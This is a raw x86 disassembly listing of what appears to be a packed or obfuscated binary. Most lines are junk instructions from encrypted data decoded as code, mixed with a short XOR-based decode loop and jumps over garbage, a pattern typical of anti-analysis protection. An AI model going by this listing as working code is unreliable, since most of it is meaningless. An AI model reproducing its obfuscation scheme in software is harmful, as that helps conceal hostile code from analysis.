  403908:	retf   0xfd2b
  40390b:	adc    DWORD PTR [esi],edx
  40390d:	dec    ebx
  40390e:	adc    DWORD PTR [esi-0x74f47ce1],esp
  403914:	sbb    al,0x41
  403916:	sub    dh,BYTE PTR [ebx-0x7d]
  403919:	cs mov edx,0x88b6b3f8
  40391f:	push   0xaf29be51
  403924:	mul    DWORD PTR [eax-0xb60c4d5]
  40392a:	and    DWORD PTR [edi],eax
  40392c:	push   0xffffffc8
  40392e:	inc    ebx
  40392f:	cdq    
  403930:	sub    dl,BYTE PTR [ebx+0x37]
  403933:	sub    al,0xb5
  403935:	and    eax,0xa2564c72
  40393a:	mov    ah,0xae
  40393c:	ror    ah,0xba
  40393f:	cld    
  403940:	mov    dh,0x6
  403942:	ds test eax,0xc4da7bcd
  403948:	popf   
  403949:	add    ch,BYTE PTR [ebx+edx*8]
  40394c:	lods   eax,DWORD PTR ds:[esi]
  40394d:	adc    eax,0x91b92e30
  403952:	cmp    DWORD PTR [ebx-0x1c8b276],esp
  403958:	rcl    BYTE PTR [ebp+0x28],cl
  40395b:	inc    ebx
  40395c:	stos   DWORD PTR es:[edi],eax
  40395d:	mov    ds:0xe76628f3,eax
  403962:	pop    esp
  403963:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403964:	aas    
  403965:	push   ecx
  403966:	shl    ah,cl
  403968:	jp     0x403949
  40396a:	jmp    0x2bc1:0x89ed30e7
  403971:	push   cs
  403972:	push   ds
  403973:	sbb    eax,0xede33685
  403978:	sahf   
  403979:	aam    0xac
  40397b:	loop   0x4039cb
  40397d:	pop    eax
  40397e:	inc    esi
  40397f:	xor    BYTE PTR [ebx],0x78
  403982:	xchg   ebp,eax
  403983:	dec    esp
  403984:	out    dx,eax
  403985:	mov    WORD PTR [esi-0x14],?
  403988:	cli    
  403989:	and    bh,ch
  40398b:	adc    DWORD PTR [edi+0x7d306b06],ebx
  403991:	retf   
  403992:	enter  0x462b,0xce
  403996:	bound  edi,QWORD PTR fs:[esi-0x71ea45ba]
  40399d:	dec    edx
  40399e:	jne    0x4039b3
  4039a0:	xor    BYTE PTR [ecx],dl
  4039a2:	scas   al,BYTE PTR es:[edi]
  4039a3:	loope  0x403990
  4039a5:	ins    DWORD PTR es:[edi],dx
  4039a6:	sahf   
  4039a7:	ss dec ebp
  4039a9:	adc    al,0x1a
  4039ab:	fs xchg edx,eax
  4039ad:	cmp    DWORD PTR [edi],eax
  4039af:	mov    ch,0xce
  4039b1:	adc    BYTE PTR [edx-0x5d],bh
  4039b4:	push   eax
  4039b5:	fbstp  TBYTE PTR [ecx+0x2b5273e0]
  4039bb:	rcr    DWORD PTR [edx],0x9
  4039be:	pop    edi
  4039bf:	and    eax,ecx
  4039c1:	fcmovb st,st(6)
  4039c3:	mov    bh,0x4e
  4039c5:	scas   al,BYTE PTR es:[edi]
  4039c6:	cdq    
  4039c7:	mov    dh,0xc8
  4039c9:	stos   DWORD PTR es:[edi],eax
  4039ca:	jae    0x4039f6
  4039cc:	sub    edi,DWORD PTR [edx-0x5e25a92e]
  4039d2:	addr16 pusha 
  4039d4:	and    DWORD PTR [ecx-0x19],esp
  4039d7:	mov    ds:0xf74144d4,eax
  4039dc:	loopne 0x40396d
  4039de:	ins    BYTE PTR es:[edi],dx
  4039df:	test   DWORD PTR [ebp+ecx*8+0x37],ebp
  4039e3:	(bad)  
  4039e5:	adc    esi,DWORD PTR [edx-0x50f05748]
  4039eb:	cmc    
  4039ec:	pop    eax
  4039ed:	sar    BYTE PTR [edx],1
  4039ef:	dec    ecx
  4039f0:	fiadd  WORD PTR [ebx]
  4039f2:	mov    DWORD PTR [esi+0x6878abf0],esp
  4039f8:	(bad)  
  4039f9:	shl    esi,0xb5
  4039fc:	pop    ebp
  4039fd:	ss test al,0x1
  403a00:	hlt    
  403a01:	ds out dx,eax
  403a03:	jmp    0x4039a0
  403a05:	xor    BYTE PTR [esi+edi*4-0x7447ffe2],al
  403a0c:	jmp    0x403992
  403a0e:	das    
  403a0f:	jae    0x4039b2
  403a11:	pop    esi
  403a12:	jne    0x403998
  403a14:	inc    ebp
  403a15:	aam    0x4a
  403a17:	push   cs
  403a18:	jnp    0x4039d6
  403a1a:	or     al,0xb
  403a1c:	mov    edx,gs
  403a1e:	and    edx,edx
  403a20:	dec    esp
  403a21:	sahf   
  403a22:	cmp    DWORD PTR [eax+0x1],edx
  403a25:	xchg   ecx,eax
  403a26:	xchg   esp,eax
  403a27:	dec    ebx
  403a28:	fcomp  DWORD PTR [esi+edx*8-0x3ade3f1e]
  403a2f:	mov    edx,0x7c081abd
  403a34:	bound  ebx,QWORD PTR [ebx+0x3f84f845]
  403a3a:	test   DWORD PTR [edx-0xd],esp
  403a3d:	xor    BYTE PTR [ebp-0xe72c51f],0x43
  403a44:	jb     0x403a76
  403a46:	mov    esi,0x5e164a82
  403a4b:	in     eax,dx
  403a4c:	xor    eax,0x8b8e39d9
  403a51:	jge    0x403a4f
  403a53:	jmp    0x403c5f
  403a58:	addr16 jo 0x403aaa
  403a5b:	or     BYTE PTR [ebx+0x33],cl
  403a5e:	arpl   WORD PTR [ebx+0x3c],si
  403a61:	aas    
  403a62:	cwde   
  403a63:	pop    ss
  403a64:	fisttp WORD PTR [ecx+edx*8]
  403a67:	in     eax,0x65
  403a69:	push   ds
  403a6a:	jl     0x403ae8
  403a6c:	ins    DWORD PTR es:[edi],dx
  403a6d:	jg     0x403aeb
  403a6f:	jl     0x403a04
  403a71:	jp     0x403a85
  403a73:	mov    eax,ds:0x3ef91e85
  403a78:	mov    al,ds:0xfb93f12e
  403a7d:	dec    edi
  403a7e:	push   cs
  403a7f:	inc    edi
  403a80:	mov    ch,BYTE PTR [esi+0x6e0bb996]
  403a86:	xor    BYTE PTR [edi-0x76],bh
  403a89:	hlt    
  403a8a:	pop    eax
  403a8b:	or     al,0x14
  403a8d:	jnp    0x403ac4
  403a8f:	mov    edx,0x516de8e
  403a94:	mov    bh,BYTE PTR [ebx*2-0x158e6987]
  403a9b:	fsub   st,st(7)
  403a9d:	fwait
  403a9e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403a9f:	pminsw mm5,QWORD PTR ds:0x24387a
  403aa6:	mov    es,WORD PTR [ecx+0x19d81051]
  403aac:	bt     esp,eax
  403aaf:	loope  0x403a9b
  403ab1:	lock and BYTE PTR [edx+0x60],dh
  403ab5:	mov    ah,0x77
  403ab7:	aaa    
  403ab8:	sub    eax,0x2c9003c8
  403abd:	and    dl,BYTE PTR [edx+0x132b2a79]
  403ac3:	imul   edi,DWORD PTR [ebx+0x45],0x58
  403ac7:	cld    
  403ac8:	sub    esp,DWORD PTR [eax]
  403aca:	sub    al,0x2e
  403acc:	inc    eax
  403acd:	and    cl,BYTE PTR [esi-0x32fae569]
  403ad3:	jo     0x403aa3
  403ad5:	adc    al,0x19
  403ad7:	push   eax
  403ad8:	and    dh,BYTE PTR [edi+0x544bf5b8]
  403ade:	push   ebx
  403adf:	sar    BYTE PTR [ecx],1
  403ae1:	add    ebx,DWORD PTR [edi]
  403ae3:	pop    ebp
  403ae4:	ficomp DWORD PTR [ebx]
  403ae6:	push   ss
  403ae7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403ae8:	dec    ebp
  403ae9:	in     eax,dx
  403aea:	(bad)  
  403aeb:	adc    ebp,edx
  403aed:	(bad)  
  403aef:	mov    DWORD PTR [esi-0xc98ced7],edi
  403af5:	or     ecx,DWORD PTR [eax+0x741fe349]
  403afb:	test   BYTE PTR [edx-0x6f],al
  403afe:	pop    eax
  403aff:	mov    bl,0xd7
  403b01:	(bad)  [ebp-0x264e3a7d]
  403b07:	out    dx,eax
  403b08:	imul   ecx,DWORD PTR [edx],0xffffffae
  403b0b:	mov    ds:0x97187c97,eax
  403b10:	or     al,0x90
  403b12:	call   0x7bfb:0x33bb49a1
  403b19:	cmp    cl,bh
  403b1b:	jns    0x403aef
  403b1d:	sbb    WORD PTR es:[ecx+0x77],dx
  403b22:	xchg   ebp,eax
  403b23:	je     0x403ac9
  403b25:	ins    BYTE PTR es:[edi],dx
  403b26:	inc    ebx
  403b27:	nop
  403b28:	mov    dh,0x95
  403b2a:	xchg   BYTE PTR [esi],al
  403b2c:	lock jo 0x403af0
  403b2f:	das    
  403b30:	mov    ds:0x9a4df89b,al
  403b35:	xor    BYTE PTR [ebx+ebp*4-0x75],dh
  403b39:	xchg   ebx,eax
  403b3a:	pop    es
  403b3b:	mov    dh,0x60
  403b3d:	fwait
  403b3e:	or     edi,DWORD PTR [esi+0x77]
  403b41:	jg     0x403b94
  403b43:	pop    ds
  403b44:	fdiv   QWORD PTR [ebx-0x5a94813a]
  403b4a:	add    eax,0x2f3e7935
  403b4f:	or     BYTE PTR [edi],bl
  403b51:	push   es
  403b52:	push   esp
  403b53:	stos   DWORD PTR es:[edi],eax
  403b54:	data16 test al,0xf
  403b57:	jne    0x403b34
  403b59:	xor    esi,DWORD PTR [ecx-0x68]
  403b5c:	mov    al,0x98
  403b5e:	mov    ds:0x5b9bd903,eax
  403b63:	push   edx
  403b64:	cli    
  403b65:	mov    edi,cs
  403b67:	in     al,0xcf
  403b69:	or     DWORD PTR [ecx],ebp
  403b6b:	xchg   esp,eax
  403b6c:	fst    QWORD PTR [esi]
  403b6e:	(bad)  
  403b6f:	dec    ebp
  403b70:	mov    ah,0xf5
  403b72:	xchg   ebp,eax
  403b73:	aad    0xf5
  403b75:	bound  edx,QWORD PTR [ecx]
  403b77:	jbe    0x403bde
  403b79:	dec    esp
  403b7a:	cmp    edx,DWORD PTR [ebp+0x67]
  403b7d:	imul   ecx,edx,0xffffffa9
  403b80:	mov    ebx,0x64d2fb19
  403b85:	xor    BYTE PTR [edi],0xf3
  403b88:	iret   
  403b89:	dec    edx
  403b8a:	xor    eax,DWORD PTR [ebx-0x6d46ef35]
  403b90:	sub    esp,eax
  403b92:	fsubr  st,st(5)
  403b94:	push   0x19
  403b96:	sbb    al,BYTE PTR [ebp-0x4]
  403b99:	push   ss
  403b9a:	sub    eax,0xd19c251
  403b9f:	mov    al,0xa7
  403ba1:	pop    ebp
  403ba2:	sbb    edi,edx
  403ba4:	xchg   edi,eax
  403ba5:	fdiv   DWORD PTR [eax-0x2410adac]
  403bab:	or     bh,BYTE PTR [edx+0x10]
  403bae:	arpl   sp,cx
  403bb0:	mov    eax,ds:0x5e3922c4
  403bb5:	inc    ecx
  403bb6:	adc    bh,ah
  403bb8:	sbb    al,0x4
  403bba:	mov    ecx,DWORD PTR [eax+eiz*8]
  403bbd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403bbe:	shl    DWORD PTR [ebx-0x3b8ad23],0x49
  403bc5:	rol    BYTE PTR [ecx-0x32139444],1
  403bcb:	mov    bh,0x61
  403bcd:	sti    
  403bce:	and    al,bl
  403bd0:	ficomp DWORD PTR [eax-0x4650d27]
  403bd6:	lods   eax,DWORD PTR ds:[esi]
  403bd7:	pop    edx
  403bd8:	sub    eax,0x4068482c
  403bdd:	xor    BYTE PTR [ebx+0x770b9d08],ah
  403be3:	mov    eax,DWORD PTR [ebx]
  403be5:	not    BYTE PTR [eax+0x57]
  403be8:	out    0x71,eax
  403bea:	sub    al,BYTE PTR [ebx-0x21436cfa]
  403bf0:	pushf  
  403bf1:	push   0xbef7a76a
  403bf6:	(bad)  
  403bf7:	cmp    eax,0x9f6d3c4a
  403bfc:	popf   
  403bfd:	scas   al,BYTE PTR es:[edi]
  403bfe:	push   ds
  403bff:	sbb    bh,dl
  403c01:	std    
  403c02:	dec    edi
  403c03:	in     al,dx
  403c04:	jl     0x403c7f
  403c06:	mov    dl,cl
  403c08:	push   ds
  403c09:	dec    edi
  403c0a:	mov    ss,WORD PTR ss:[esi-0x51db8081]
  403c11:	push   0x7325cce5
  403c16:	enter  0x5e59,0xff
  403c1a:	sbb    DWORD PTR [edx],0xffffffaa
  403c1d:	repnz or DWORD PTR [edx+0x3e],esi
  403c21:	sar    ebx,0xda
  403c24:	frndint 
  403c26:	adc    DWORD PTR [edi],ebp
  403c28:	loope  0x403bb3
  403c2a:	pop    esi
  403c2b:	test   BYTE PTR [edx],0xad
  403c2e:	xor    eax,0xbd3c622d
  403c33:	in     al,0xe5
  403c35:	mov    eax,ds:0xe936c09c
  403c3a:	cmp    eax,0xf9bec0fd
  403c3f:	aam    0x85
  403c41:	popf   
  403c42:	jae    0x403c98
  403c44:	push   ebp
  403c45:	addr16 ret 
  403c47:	lea    eax,[eax+0x1e9a6ca6]
  403c4d:	fisttp DWORD PTR [edx]
  403c4f:	test   al,0x47
  403c51:	mov    esp,0x6d8cbe32
  403c56:	int    0x64
  403c58:	sub    eax,0xd5b285a1
  403c5d:	fiadd  WORD PTR [ebp+0x33]
  403c60:	stc    
  403c61:	add    edi,esi
  403c63:	mov    esi,DWORD PTR [ebp+0x8]
  403c66:	imul   edi,edx
  403c69:	mov    ebx,DWORD PTR [ebp+0xc]
  403c6c:	xor    eax,ecx
  403c6e:	add    eax,edx
  403c70:	mov    al,BYTE PTR [ebx+eax*1+0x32729a]
  403c77:	mov    BYTE PTR [edi+esi*1],al
  403c7a:	mov    eax,DWORD PTR [ebp-0x4]
  403c7d:	xor    eax,ecx
  403c7f:	lea    edx,[edx+eax*1+0x32729a]
  403c86:	mov    eax,DWORD PTR [ebp-0x4]
  403c89:	xor    eax,ecx
  403c8b:	mov    esi,0xffcd8d66
  403c90:	jmp    0x403e9c
  403c95:	dec    edi
  403c96:	push   ss
  403c97:	sbb    eax,DWORD PTR [ebp+ebp*2+0x7d]
  403c9b:	jae    0x403cae
  403c9d:	sti    
  403c9e:	adc    ebp,DWORD PTR ds:0x6edbd197
  403ca4:	sbb    al,0x4a
  403ca6:	sbb    BYTE PTR [esp+edi*2+0x6d],bh
  403caa:	jg     0x403d28
  403cac:	jl     0x403cd9
  403cae:	mov    ebp,0xcee8e11d
  403cb3:	pop    ecx
  403cb4:	pop    ecx
  403cb5:	fs xor al,0xe3
  403cb8:	scas   al,BYTE PTR es:[edi]
  403cb9:	rol    BYTE PTR [edi+0x21],cl
  403cbc:	sub    cl,al
  403cbe:	adc    BYTE PTR [ecx-0x31],cl
  403cc1:	push   ebp
  403cc2:	mov    ebp,0x4f626b21
  403cc7:	mov    dh,0xd5
  403cc9:	into   
  403cca:	repz test eax,0x449d4aa1
  403cd0:	fistp  WORD PTR [ebp+0x53]
  403cd3:	cmp    BYTE PTR [edi-0x4a],cl
  403cd6:	call   0xc6c0:0xdbc9eb31
  403cdd:	push   es
  403cde:	cwde   
  403cdf:	xchg   esp,eax
  403ce0:	push   eax
  403ce1:	mov    ds:0x65222ad8,al
  403ce6:	inc    eax
  403ce7:	xchg   edx,eax
  403ce8:	pop    edi
  403ce9:	lods   eax,DWORD PTR ds:[esi]
  403cea:	sahf   
  403ceb:	(bad)  
  403cec:	nop
  403ced:	and    DWORD PTR [edx-0x5f],0xf67ed188
  403cf4:	out    dx,eax
  403cf5:	aad    0xa6
  403cf7:	sub    ebp,DWORD PTR [edx-0x1e6d65b6]
  403cfd:	mov    esi,0x441ac6d1
  403d02:	xchg   esp,eax
  403d03:	or     BYTE PTR [ebx],0xea
  403d06:	inc    esp
  403d07:	fisub  WORD PTR [edx]
  403d09:	sub    eax,0x540f1c82
  403d0e:	add    al,0xeb
  403d10:	xchg   ecx,eax
  403d11:	lock mov esi,0x3d4d4eca
  403d17:	in     al,dx
  403d18:	in     al,dx
  403d19:	sub    bh,BYTE PTR [ebx-0x3e]
  403d1c:	xlat   BYTE PTR ds:[ebx]
  403d1d:	mov    bh,0x85
  403d1f:	xchg   DWORD PTR [esi],edi
  403d21:	stos   BYTE PTR es:[edi],al
  403d22:	mov    eax,ds:0xfb1cb360
  403d27:	je     0x403cda
  403d29:	jbe    0x403d35
  403d2b:	int3   
  403d2c:	mov    eax,ds:0x175e0731
  403d31:	cs push ebx
  403d33:	iret   
  403d34:	clc    
  403d35:	sbb    DWORD PTR [ebx-0x6d],esp
  403d38:	jmp    0x14d3:0xc563a78e
  403d3f:	out    0xae,eax
  403d41:	ja     0x403d57
  403d43:	mov    WORD PTR [edi+0x1f],cs
  403d46:	xor    eax,DWORD PTR [eax+0x2efaad04]
  403d4c:	xchg   ebp,eax
  403d4d:	pop    esp
  403d4e:	xchg   esi,eax
  403d4f:	jecxz  0x403cf9
  403d51:	test   ebx,0x20c13e84
  403d57:	cld    
  403d58:	jns    0x403dd9
  403d5a:	loopne 0x403d56
  403d5c:	adc    esi,esp
  403d5e:	pop    ds
  403d5f:	out    0xce,eax
  403d61:	enter  0xaf95,0xdc
  403d65:	xchg   edi,eax
  403d66:	sar    DWORD PTR [ecx],1
  403d68:	jecxz  0x403d9a
  403d6a:	outs   dx,DWORD PTR ds:[esi]
  403d6b:	or     esp,DWORD PTR [esi+0x50]
  403d6e:	es cli 
  403d70:	pop    esp
  403d71:	stos   BYTE PTR es:[edi],al
  403d72:	pop    eax
  403d73:	push   esp
  403d74:	imul   edx,DWORD PTR [esi],0x35
  403d77:	pop    es
  403d78:	add    ecx,ebp
  403d7a:	mov    ebx,0xa3e7d262
  403d7f:	inc    edx
  403d80:	scas   eax,DWORD PTR es:[edi]
  403d81:	out    dx,al
  403d82:	xchg   esp,eax
  403d83:	xchg   esp,eax
  403d84:	imul   ecx,DWORD PTR [esp+ebp*4-0x45],0x8f962dc1
  403d8c:	xbegin 0xae23612
  403d92:	repnz cmp BYTE PTR [ebp+0x6fb36c86],dh
  403d99:	imul   eax,ecx,0xcccce6c1
  403d9f:	sti    
  403da0:	cli    
  403da1:	adc    DWORD PTR [eax+0x32],ebp
  403da4:	mov    dh,0x2d
  403da6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403da7:	sbb    BYTE PTR [edi+ecx*8+0x4cf5668d],bl
  403dae:	adc    BYTE PTR [esi+0x3c],ch
  403db1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403db2:	mov    esi,0xdb09920a
  403db7:	push   0x3ff9dbc9
  403dbc:	je     0x403da6
  403dbe:	dec    ecx
  403dbf:	stos   BYTE PTR es:[edi],al
  403dc0:	ins    BYTE PTR es:[edi],dx
  403dc1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403dc2:	not    BYTE PTR [ebx]
  403dc4:	outs   dx,DWORD PTR ds:[esi]
  403dc5:	sar    DWORD PTR [esp+edi*8],cl
  403dc8:	push   eax
  403dc9:	lock mov al,gs:0x3303fd48
  403dd0:	fstp   QWORD PTR [esp+eax*1+0x1395a843]
  403dd7:	sub    ah,bh
  403dd9:	jbe    0x403e2e
  403ddb:	inc    edi
  403ddc:	xchg   ebp,eax
  403ddd:	lods   eax,DWORD PTR ds:[esi]
  403dde:	jbe    0x403d95
  403de0:	int    0xef
  403de2:	dec    ebx
  403de3:	jg     0x403e40
  403de5:	leave  
  403de6:	mov    cs,WORD PTR [edx-0xe]
  403de9:	out    dx,eax
  403dea:	and    eax,0x64f30451
  403def:	pop    esp
  403df0:	loopne 0x403d8c
  403df2:	mov    cl,0x8a
  403df4:	pop    esp
  403df5:	pop    ebx
  403df6:	dec    edx
  403df7:	mov    ds:0xc1e4dd17,eax
  403dfc:	or     al,0x29
  403dfe:	(bad)  
  403dff:	stc    
  403e00:	adc    DWORD PTR [ebx],edi
  403e02:	pop    edx
  403e03:	jns    0x403e1b
  403e05:	into   
  403e06:	jo     0x403e06
  403e08:	jne    0x403e6d
  403e0a:	out    dx,eax
  403e0b:	into   
  403e0c:	movups XMMWORD PTR [ebx+eax*1+0x63441929],xmm5
  403e14:	mov    al,0xfa
  403e16:	sahf   
  403e17:	aad    0x4e
  403e19:	int3   
  403e1a:	cmp    BYTE PTR ds:[edx+0x3ee32364],cl
  403e21:	inc    edi
  403e22:	test   BYTE PTR [ebx+esi*1+0x79],ah
  403e26:	adc    al,0x7e
  403e28:	adc    BYTE PTR [ebx],bh
  403e2a:	cmp    DWORD PTR [eax+0x285587c7],ecx
  403e30:	inc    edx
  403e31:	dec    ebp
  403e32:	mov    al,ds:0xeba2125
  403e37:	pop    es
  403e38:	sub    al,0x35
  403e3a:	push   es
  403e3b:	jno    0x403e8b
  403e3d:	stc    
  403e3e:	add    BYTE PTR [eax],ah
  403e40:	ja     0x403e81
  403e42:	pop    edi
  403e43:	or     bh,BYTE PTR [ecx-0x33]
  403e46:	ja     0x403df3
  403e48:	stc    
  403e49:	xor    eax,0xf85f006e
  403e4e:	lock ds das 
  403e51:	loop   0x403e5b
  403e53:	out    dx,al
  403e54:	pop    es
  403e55:	inc    esi
  403e56:	and    DWORD PTR [esi],0x57
  403e59:	sub    ebx,edx
  403e5b:	jns    0x403e93
  403e5d:	sub    esi,DWORD PTR [ebp+0x63]
  403e60:	imul   ebp,DWORD PTR [ecx+0x4f],0x32
  403e64:	push   edx
  403e65:	sbb    BYTE PTR [ebx],0x79
  403e68:	aam    0xb0
  403e6a:	add    DWORD PTR [ecx],ebx
  403e6c:	xstore-rng (bad)
  403e6d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403e6e:	add    al,0xb4
  403e70:	or     ecx,ebx
  403e72:	scas   al,BYTE PTR es:[edi]
  403e73:	push   0x10
  403e75:	adc    DWORD PTR [eax],0x3abed965
  403e7b:	inc    ebp
  403e7c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403e7d:	iret   
  403e7e:	ret    0x6891
  403e81:	or     al,0xf4
  403e83:	mov    dl,0xad
  403e85:	dec    ecx
  403e86:	(bad)  
  403e87:	dec    esp
  403e88:	mov    ch,0xc3
  403e8a:	and    ecx,DWORD PTR [esi+0x76a484f1]
  403e90:	sbb    esi,esp
  403e92:	(bad)  
  403e93:	in     al,dx
  403e94:	push   esp
  403e95:	mov    edx,0xb4650649
  403e9a:	add    al,bh
  403e9c:	sub    esi,eax
  403e9e:	add    esi,DWORD PTR [ebp+0x10]
  403ea1:	cmp    edx,esi
  403ea3:	jbe    0x403630
  403ea9:	pop    ebx
  403eaa:	mov    eax,0xf89c8534
  403eaf:	pop    edi
  403eb0:	pop    esi
  403eb1:	leave  
  403eb2:	ret    0xc
  403eb5:	push   ebp
  403eb6:	mov    ebp,esp
  403eb8:	mov    eax,DWORD PTR [ebp+0xc]
  403ebb:	xor    edx,edx
  403ebd:	mov    ecx,0x7264fcad
  403ec2:	div    ecx
  403ec4:	mov    ecx,DWORD PTR [ebp+0x10]
  403ec7:	and    ecx,eax
  403ec9:	jmp    0x4040d5
  403ece:	(bad)  
  403ecf:	addr16 jns 0x403f24
  403ed2:	icebp  
  403ed3:	jb     0x403f28
  403ed5:	ins    DWORD PTR es:[edi],dx
  403ed6:	add    al,0x2a
  403ed8:	pop    esi
  403ed9:	push   0x5c356f3e
  403ede:	mov    ebx,0x6d7c7c1a
  403ee3:	jg     0x403f61
  403ee5:	jl     0x403eb2
  403ee7:	enter  0x29e9,0xf3
  403eeb:	mov    ss,ebp
  403eed:	clc    
  403eee:	neg    DWORD PTR [edi+0x79]
  403ef1:	fild   DWORD PTR [eax+0x72]
  403ef4:	iret   
  403ef5:	dec    BYTE PTR [ebx]
  403ef7:	or     edx,DWORD PTR [eax]
  403ef9:	adc    esi,DWORD PTR [edi-0x46]
  403efc:	inc    esi
  403efd:	inc    esp
  403efe:	pop    esi
  403eff:	inc    esi
  403f00:	test   al,0x8f
  403f02:	daa    
  403f03:	psubsw mm7,mm1
  403f06:	repz adc ch,BYTE PTR [ebp-0x6b]
  403f0a:	js     0x403f39
  403f0c:	pop    es
  403f0d:	stos   BYTE PTR es:[edi],al
  403f0e:	fst    QWORD PTR [eax+eax*8-0xf29921e]
  403f15:	sbb    DWORD PTR [ebx-0x1de40733],edi
  403f1b:	push   eax
  403f1c:	mov    BYTE PTR [ebx-0xa],ah
  403f1f:	push   edi
  403f20:	mov    ds:0x5aeb5b1c,eax
  403f25:	xor    ah,BYTE PTR [ebx]
  403f27:	test   BYTE PTR [ebp+0x78],bl
  403f2a:	das    
  403f2b:	or     BYTE PTR [eax],0x64
  403f2e:	mov    al,0x90
  403f30:	add    DWORD PTR [esi+0x5276cd47],0x3d2b2119
  403f3a:	or     esp,ebx
  403f3c:	sbb    edx,0xa46c595
  403f42:	jmp    0xcfe877af
  403f47:	fwait
  403f48:	call   0xeee67759
  403f4d:	adc    al,BYTE PTR [edx]
  403f4f:	ficom  DWORD PTR [esi+0x496b080a]
  403f55:	fild   DWORD PTR [ecx+0x21]
  403f58:	or     al,0x97
  403f5a:	or     esi,ecx
  403f5c:	in     eax,dx
  403f5d:	add    BYTE PTR [ebx-0x69ae0900],bl
  403f63:	(bad)  
  403f64:	js     0x403f4c
  403f66:	xor    ebp,DWORD PTR [edx]
  403f68:	push   ds
  403f69:	fimul  WORD PTR [eax+0x7f046fc8]
  403f6f:	rol    BYTE PTR [ebp-0x76],cl
  403f72:	xor    dh,BYTE PTR [ebx-0x1ccb4f87]
  403f78:	fcomp  DWORD PTR [ecx-0x75]
  403f7b:	aaa    
  403f7c:	or     ebp,esi
  403f7e:	sub    cl,BYTE PTR [eax-0x42]
  403f81:	int3   
  403f82:	pop    edi
  403f83:	xchg   ecx,ebx
  403f85:	outs   dx,BYTE PTR ds:[esi]
  403f86:	mov    eax,0xcbb59db0
  403f8b:	cs sahf 
  403f8d:	sub    al,0x79
  403f8f:	xor    al,0x9b
  403f91:	outs   dx,DWORD PTR ds:[esi]
  403f92:	dec    ebx
  403f93:	pusha  
  403f94:	xchg   BYTE PTR [esi-0x5],bh
  403f97:	mov    al,0x8b
  403f99:	add    DWORD PTR [esi+ecx*8+0x79],ecx
  403f9d:	stos   DWORD PTR es:[edi],eax
  403f9e:	loopne 0x403f5d
  403fa0:	mov    esi,0xec317cb0
  403fa5:	loope  0x404001
  403fa7:	imul   edx,DWORD PTR [ecx+esi*8+0x61],0x22adb741
  403faf:	lea    esi,[bp+di]
  403fb2:	test   al,0xfb
  403fb4:	lock arpl WORD PTR [ecx],ax
  403fb7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403fb8:	cmp    edi,DWORD PTR [edx]
  403fba:	in     al,dx
  403fbb:	sahf   
  403fbc:	cmp    DWORD PTR [eax+0x550f166a],0x4b
  403fc3:	lahf   
  403fc4:	or     DWORD PTR [eax],esi
  403fc6:	jnp    0x403fe2
  403fc8:	inc    esp
  403fc9:	dec    esp
  403fca:	jnp    0x40402b
  403fcc:	jo     0x404024
  403fce:	inc    esp
  403fcf:	sti    
  403fd0:	mov    dl,0xc9
  403fd2:	and    edi,DWORD PTR [edi+0x6d]
  403fd5:	shr    BYTE PTR [edx],cl
  403fd7:	(bad)  
  403fd9:	inc    esi
  403fda:	xlat   BYTE PTR ds:[ebx]
  403fdb:	ins    BYTE PTR es:[edi],dx
  403fdc:	and    esp,DWORD PTR [esi+edi*4]
  403fdf:	or     eax,0xec06da56
  403fe4:	sub    esi,eax
  403fe6:	(bad)  
  403fe7:	test   ecx,esi
  403fe9:	cdq    
  403fea:	inc    ecx
  403feb:	aad    0x16
  403fed:	outs   dx,DWORD PTR ds:[esi]
  403fee:	enter  0xa9f,0x6f
  403ff2:	sbb    DWORD PTR [ecx],ebp
  403ff4:	dec    edx
  403ff5:	add    DWORD PTR [edx],edx
  403ff7:	pop    eax
  403ff8:	push   ebp
  403ff9:	dec    ebp
  403ffa:	jbe    0x403ffa
  403ffc:	ins    DWORD PTR es:[edi],dx
  403ffd:	push   edi
  403ffe:	sahf   
  403fff:	cmp    al,0x45
  404001:	pop    ebp
  404002:	sub    BYTE PTR [ecx+0x7c3efd40],ah
  404008:	push   0xffffffb8
  40400a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40400b:	cmp    eax,0x6595fa86
  404010:	push   ds
  404011:	cmovno esp,DWORD PTR ds:0x96c09ce2
  404018:	pop    edi
  404019:	(bad)  
  40401a:	outs   dx,BYTE PTR ds:[esi]
  40401b:	das    
  40401c:	cs inc ebp
  40401e:	aam    0xbd
  404020:	push   ebx
  404021:	in     al,0xdb
  404023:	(bad)  
  404024:	dec    eax
  404025:	xor    DWORD PTR [esi],ebp
  404027:	and    bl,cl
  404029:	or     eax,0x8b10b75d
  40402e:	xor    DWORD PTR ds:0x825c2b7,esp
  404034:	inc    ebx
  404035:	mov    bh,0xcf
  404037:	or     edx,edi
  404039:	sub    ebp,DWORD PTR [edx+0x50]
  40403c:	mov    ds:0x7e0119f4,al
  404041:	xchg   DWORD PTR [ecx-0x10],edx
  404044:	sbb    DWORD PTR [edi],edi
  404046:	out    0x2c,al
  404048:	fidiv  DWORD PTR [eax]
  40404a:	mov    edi,0x2e1d1b8c
  40404f:	pop    ebp
  404050:	fisttp QWORD PTR cs:[ebx+0x34]
  404054:	mov    eax,ds:0x37e40243
  404059:	les    edx,FWORD PTR [edi+edi*8]
  40405c:	out    0x3,al
  40405e:	mov    eax,0x77567
  404063:	pop    ecx
  404064:	jae    0x404040
  404066:	cdq    
  404067:	fstp   QWORD PTR [ecx-0x38]
  40406a:	es sahf 
  40406c:	xchg   edi,eax
  40406d:	out    0x20,al
  40406f:	imul   edi,DWORD PTR [edi-0x5d0facdc],0xffffff87
  404076:	popa   
  404077:	mov    edi,0xaaab096e
  40407c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40407d:	or     ah,BYTE PTR [eax+0x67]
  404080:	rol    ah,1
  404082:	(bad)  
  404083:	mov    ah,0xd3
  404085:	call   0xae48:0x67c61661
  40408c:	sub    al,bh
  40408e:	pop    edi
  40408f:	loopne 0x40409b
  404091:	or     al,0xcf
  404093:	xchg   edx,eax
  404094:	pop    ss
  404095:	inc    eax
  404096:	in     al,0xde
  404098:	leave  
